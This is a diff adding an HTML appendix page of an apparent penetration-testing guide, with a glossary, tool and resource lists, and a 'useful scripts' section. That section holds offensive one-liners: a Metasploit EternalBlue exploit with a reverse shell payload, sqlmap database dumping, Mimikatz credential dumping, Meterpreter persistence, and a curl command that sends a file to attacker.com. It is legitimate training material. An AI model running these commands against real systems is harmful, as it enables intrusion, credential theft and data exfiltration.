@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Appendices</title>
+    <style>
+        body {
+            font-family: 'Verdana', sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            /* Center all text */
+        }
+
+        header {
+            background-image: url('https://i.ibb.co/JRsb9y2/809365338-15168-qutote-anonymous-i-am-free-1539476189.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+            height: 85vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+            padding: 10px;
+            color: yellow;
+            border-bottom: 5px solid #b30000;
+        }
+
+        h1 {
+            font-size: 3em;
+            margin: 0;
+            text-shadow: 2px 2px 0px black, 4px 4px 0px red;
+            /* Add shadow like in previous example */
+            padding-bottom: 20px;
+        }
+
+        h2,
+        h3,
+        h4 {
+            color: #b30000;
+            text-align: center;
+            /* Centered section headings */
+        }
+
+        .content {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+
+        pre {
+            background-color: #282c34;
+            color: yellow;
+            padding: 15px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.6);
+            overflow-x: auto;
+            white-space: pre-wrap;
+            margin: 15px 0;
+            text-align: left;
+            /* Align text to the left in code blocks for better readability */
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #111;
+            border-top: 5px solid #b30000;
+            width: 100%;
+        }
+
+        footer p {
+            color: yellow;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>Appendices</h1>
+    </header>
+
+    <div class="content">
+        <p>The appendices provide supplementary information that enhances the understanding and utility of the topics covered in this guide. This section includes a glossary of terms, useful scripts and commands, additional tools and resources, and contact
+            information for collaborators or mentors.</p>
+
+        <h2 id="glossary">12.1 Glossary of Terms</h2>
+        <p>Understanding key terms is essential for navigating the field of cybersecurity. This glossary defines important concepts and terminology used throughout this guide.</p>
+
+        <p><strong>Authentication</strong>: The process of verifying the identity of a user or system.</p>
+        <p><strong>Authorization</strong>: The process of determining what actions or resources a user or system is permitted to access.</p>
+        <p><strong>Buffer Overflow</strong>: A vulnerability that occurs when a program writes more data to a buffer than it can hold, potentially leading to code execution.</p>
+        <p><strong>Cross-Site Scripting (XSS)</strong>: A vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.</p>
+        <p><strong>Denial of Service (DoS)</strong>: An attack that aims to make a system or network unavailable by overwhelming it with traffic or exploiting vulnerabilities.</p>
+        <p><strong>Encryption</strong>: The process of converting data into a secure format that can only be read by authorized parties.</p>
+        <p><strong>Firewall</strong>: A network security device or software that monitors and controls incoming and outgoing network traffic based on predefined security rules.</p>
+        <p><strong>Intrusion Detection System (IDS)</strong>: A system that monitors network or system activities for malicious actions or policy violations.</p>
+        <p><strong>Malware</strong>: Malicious software designed to harm, exploit, or otherwise compromise a computer system.</p>
+        <p><strong>Phishing</strong>: A social engineering technique where attackers send fraudulent messages to trick individuals into disclosing sensitive information.</p>
+        <p><strong>Ransomware</strong>: Malware that encrypts a victim's data and demands payment for the decryption key.</p>
+        <p><strong>Remote Code Execution (RCE)</strong>: A vulnerability that allows attackers to execute arbitrary code on a remote system.</p>
+        <p><strong>SQL Injection (SQLi)</strong>: A vulnerability that allows attackers to execute malicious SQL statements on a database.</p>
+        <p><strong>Virtual Private Network (VPN)</strong>: A technology that creates a secure connection over a less secure network, such as the internet.</p>
+
+        <h2 id="scripts">12.2 Useful Scripts and Commands</h2>
+        <p>Scripts and commands are fundamental tools for penetration testing and cybersecurity activities. This section provides examples of useful scripts and commands that can aid in various tasks.</p>
+
+        <h3>Network Scanning</h3>
+        <p><strong>Nmap Port Scan</strong>:
+            <pre><code>nmap -sT 192.168.1.0/24</code></pre>
+        </p>
+        <p><strong>Nmap OS Detection</strong>:
+            <pre><code>nmap -O 192.168.1.20</code></pre>
+        </p>
+
+        <h3>Vulnerability Scanning</h3>
+        <p><strong>Nessus Command Line</strong>:
+            <pre><code>nessus -q -x -i -d /path/to/scan/file.nessus</code></pre>
+        </p>
+
+        <h3>Exploitation</h3>
+        <p><strong>Metasploit - EternalBlue Exploit</strong>:
+            <pre><code>use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.1.20
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit
+</code></pre>
+        </p>
+        <p><strong>SQLMap - SQL Injection</strong>:
+            <pre><code>sqlmap -u "<http://example.com/login.php>" --data "username=admin&password=admin" --dump</code></pre>
+        </p>
+
+        <h3>Post-Exploitation</h3>
+        <p><strong>Mimikatz - Dump Credentials</strong>:
+            <pre><code>mimikatz # sekurlsa::logonpasswords</code></pre>
+        </p>
+        <p><strong>Meterpreter - Persistence</strong>:
+            <pre><code>run persistence -X -i 10 -p 4444 -r &lt;IP&gt;</code></pre>
+        </p>
+
+        <h3>Data Exfiltration</h3>
+        <p><strong>HTTP Data Exfiltration</strong>:
+            <pre><code>curl -X POST -d "data=$(cat sensitive_data.txt)" &lt;http://attacker.com/upload&gt;</code></pre>
+        </p>
+        <p><strong>DNS Tunneling with dnscat2</strong>:
+            <pre><code>dnscat2 --dns @&lt;dns_server&gt; &lt;domain&gt;</code></pre>
+        </p>
+
+        <h2 id="tools">12.3 Additional Tools and Resources</h2>
+        <p>Beyond the tools discussed in previous chapters, several additional resources can enhance your cybersecurity toolkit.</p>
+
+        <h3>Tools</h3>
+        <p><strong>Wireshark</strong>: A network protocol analyzer for network troubleshooting and analysis.</p>
+        <p><strong>Hydra</strong>: A fast and flexible credential brute-forcing tool.</p>
+        <p><strong>John the Ripper</strong>: A popular password cracking tool.</p>
+        <p><strong>Hashcat</strong>: A powerful password recovery tool that supports a variety of hash algorithms.</p>
+        <p><strong>Kali Linux</strong>: A Debian-based Linux distribution designed for digital forensics and penetration testing.</p>
+
+        <h3>Resources</h3>
+        <p><strong>OWASP Top Ten</strong>: A list of the ten most critical web application security risks, maintained by the Open Web Application Security Project (OWASP).</p>
+        <p><strong>Exploit Database</strong>: A comprehensive archive of exploits and vulnerable software, maintained by Offensive Security.</p>
+        <p><strong>Cybersecurity Framework</strong>: Guidelines and best practices for managing cybersecurity risk, developed by the National Institute of Standards and Technology (NIST).</p>
+        <p><strong>SANS Reading Room</strong>: A repository of whitepapers and research on various cybersecurity topics, provided by the SANS Institute.</p>
+
+        <h2 id="contact">12.4 Contact Information for Collaborators or Mentors</h2>
+        <p>Having access to mentors and collaborators can significantly enhance your learning and professional growth. Building a network of experienced professionals can provide guidance, support, and valuable insights. Here are some ways to connect with
+            mentors and collaborators:</p>
+
+        <h3>Professional Organizations</h3>
+        <p><strong>ISACA</strong>: Website: <a href="https://www.isaca.org/" style="color: #b30000;">www.isaca.org</a>. Membership offers access to local chapters, networking events, and professional development resources.</p>
+
+        <p><strong>(ISC)²</strong>: Website: <a href="https://www.isc2.org/" style="color: #b30000;">www.isc2.org</a>. Membership provides access to a global community of cybersecurity professionals, certifications, and educational resources.</p>
+
+        <p><strong>SANS Institute</strong>: Website: <a href="https://www.sans.org/" style="color: #b30000;">www.sans.org</a>. Training and certification offer a wide range of training programs, certifications, and community events.</p>
+
+        <h3>Online Communities</h3>
+        <p><strong>LinkedIn</strong>: Networking by joining cybersecurity groups and connecting with industry professionals. Mentorship programs are available through LinkedIn.</p>
+
+        <p><strong>Reddit</strong>: Engage with communities such as r/netsec and r/hacking to share knowledge and seek advice.</p>
+
+        <p><strong>GitHub</strong>: Contribute to open-source projects and collaborate with other cybersecurity enthusiasts.</p>
+
+        <h2>Summary</h2>
+        <p>The appendices provide valuable supplementary information, enhancing the practical application of the concepts covered in this guide. From understanding key terms and leveraging useful scripts to exploring additional tools and resources, this
+            section serves as a comprehensive reference for cybersecurity professionals. Building a network of mentors and collaborators further enriches your learning experience and professional growth.</p>
+    </div>
+
+    <footer>
+        <p>© 2024 Penetration Testers Cookbook. All rights reserved.</p>
+    </footer>
+</body>
+
+</html>
